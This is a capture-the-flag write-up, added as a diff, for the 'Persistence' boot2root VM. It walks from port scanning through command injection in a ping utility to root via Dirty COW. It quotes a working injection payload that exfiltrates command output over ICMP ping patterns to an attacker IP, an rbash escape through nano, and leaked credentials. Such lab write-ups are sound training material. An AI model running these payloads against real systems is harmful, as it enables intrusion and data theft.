@@ -1,0 +1,68 @@
+# Discovery
+After finding the IP of the machine I used nmap to scan its ports and I saw that
+it was only listening on port 80. I used dirbuster to look for other files and
+saw that there's a "debug.php" page that has a utility for pinging computers. 
+
+# Command Injection
+This utility doesn't sanitize user input so I was able to inject command. However, I
+couldn't get any output. I tried to run a one-line reverse shell but the VM didn't
+reach me. After a while I figured out that I could only send ICMP packets due to
+some firewall rules. However, we can control the pattern that is sent with PING
+packets so I worked on sending data over it.
+I found out that this payload works:
+	127.0.0.1; OUT=`{CMD}| xxd -p`; for i in $OUT; do ping -c 1 -p $i 192.168.80.135; done;
+
+# Non interactive Shell
+I wrote a shell client that sends the commands with this line and set up a thread
+that sniffs ICMP packets and created a little non-interactive shell. When I ran
+`ls` I saw that there's a SUID file called "sysadmin-tool". I downloaded it and started
+to analyze it with ltrace and strings and eventually with IDA. I saw that it uses "sed"
+which is a stream editor to uncomment lines in a file at /etc/sysconfig/iptables and after
+that redirecting the uncommented file into iptables-restore, which meant that this program
+changed the firewall settings. After a while I thought about scanning the machine to look
+if anything changed and I saw that port 22 suddenly became open. I tried logging in with 
+the credentials that sysadmin-tool wrote (avida:dollars) and I was logged in with a somewhat
+proper shell.
+
+# Interactive shell with a low-privileged user
+It was a rbash shell which is a shell without many features. I looked at the binaries
+I was able to call (since rbash doesn't allow calling a binary with "/" in the name) and saw that
+nano was one of them. I looked in GTFObins and found an escape through nano:
+	nano -s /bin/sh
+	/bin/bash
+	^T
+after that I was prompted with a regular bash shell. I set the path variables to the regular
+ones in addition to the ones I had before (added /bin, /sbin etc.) and I started enumerating
+in order to find a way to escalate privileges. I used linpeas.sh which prompted me that the kernel
+version is very old and that it would be a good way to escalate privileges. I also saw a couple of
+services, one of them looked like the intended way but I decided to look at kernel exploits before
+going for a custom exploitation path. After a couple of exploits (and one kernel panic) I used
+dirty cow (https://github.com/FireFart/dirtycow/blob/master/dirty.c) and after that I had a 
+user with the creds of "firefart::abcd" with root privileges.
+
+#### FLAG ####
+
+              .d8888b.  .d8888b. 888    
+             d88P  Y88bd88P  Y88b888    
+             888    888888    888888    
+888  888  888888    888888    888888888 
+888  888  888888    888888    888888    
+888  888  888888    888888    888888    
+Y88b 888 d88PY88b  d88PY88b  d88PY88b.  
+ "Y8888888P"  "Y8888P"  "Y8888P"  "Y888
+
+Congratulations!!! You have the flag!
+
+We had a great time coming up with the 
+challenges for this boot2root, and we 
+hope that you enjoyed overcoming them. 
+
+Special thanks goes out to @VulnHub for 
+hosting Persistence for us, and to 
+@recrudesce for testing and providing 
+valuable feedback! 
+
+Until next time, 
+      sagi- & superkojiman
+
+
